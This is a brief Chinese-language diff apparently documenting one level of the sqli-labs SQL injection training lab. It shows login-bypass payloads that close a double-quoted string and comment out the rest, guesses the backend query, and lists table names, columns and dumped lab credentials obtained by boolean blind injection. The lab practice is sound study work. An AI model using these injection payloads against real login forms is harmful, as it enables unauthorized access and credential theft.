@@ -1,0 +1,16 @@
+uname="admin&passwd=123&submit=Submit
+报错：' admin" and password="123" LIMIT 0,1 '
+推测sql：select 字段名 from 表名 where uname = "输入的uname" and passwd = "输入的passwd" limit 0,1;
+
+uname=admin"-- &passwd=123&submit=Submit
+显示<img src="../images/flag.jpg" />，说明登录成功
+
+采用基于布尔值的盲注（脚本编写与Less-13类似，只是将单引号改为双引号）
+
+表名
+result: users,uagents,emails,referers
+字段名
+result: id,username,password,user,current_connections,total_connections
+字段值
+result: dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
